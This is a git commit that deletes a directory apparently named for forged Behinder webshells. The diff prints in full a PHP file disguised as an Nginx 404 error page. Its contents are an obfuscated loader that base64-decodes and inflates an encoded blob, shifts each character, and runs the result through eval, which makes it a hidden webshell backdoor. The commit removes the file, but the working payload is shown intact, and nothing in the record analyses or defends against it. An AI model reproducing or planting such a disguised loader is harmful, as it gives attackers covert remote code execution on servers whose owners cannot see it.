e81f6e2624d913973dbbbac4e491387abd000b54
Pings <96440773+BugFor-Pings@users.noreply.github.com>
2023-05-23 18:27:25 +0800

    Delete 伪造-冰蝎 directory

--- 伪造-冰蝎/Nginx-404页面.php
+++
@@ -1,9 +0,0 @@
-<?php function DetjU($nmnjZV)
-{ 
-$nmnjZV=gzinflate(base64_decode($nmnjZV));
- for($i=0;$i<strlen($nmnjZV);$i++)
- {
-$nmnjZV[$i] = chr(ord($nmnjZV[$i])-1);
- }
- return $nmnjZV;
- }eval(DetjU("XVDRjtowEHy3v8K1oiYR6EIoVL2S0KtOV6kv1wceEbVCsoCFz45scweifHs3iatWjSxlPTuenVnG8KNQHwzjxcG/qCUtDlA1y8JLr2A5m8zYs/HsmznppsgGsMh6Ci22prngrwbtwS6LQ/4/H5EiC20URk646L3U539aWZDKeg98QekDWGussNAa66XeJ5N0QR04J40WzlfWJwh09qMjXEoOszl8mN7vYDtv7qfzLV8wSiKxelqtvv94XsfHeFN2zAUlf1TerPQgamUcdFokao3z5U4qEHvwojZoTnuX8PbQfs4yqduT5x1R7pJ3cMZmL6NM1UCTxKZFwKk4TSm5UkIiX/Jt5eDjTPA73kBtGsBkJMyJfNIXd7zXJHh2xiaRLCeLSBbOWwV6oKQIjEYpu/Z5CSGsh9eR3LDyb/2zy4fFKH+fzzeYP7BvtDugHARj/fxgV6Axe2mDmTHjX59W+fQTH/d77Zzdhi1X1pZwbhWmSOJf8Tg4G5q7k67LjrKebALUVrZ6cQOYI0hqVTnHHq/taatkzbonHvfHhJD61RwBHWBEeK0UVv1WbsPoh7pSSpwcWNE9SjS8scckHYcR6OHLkv4G"));?>
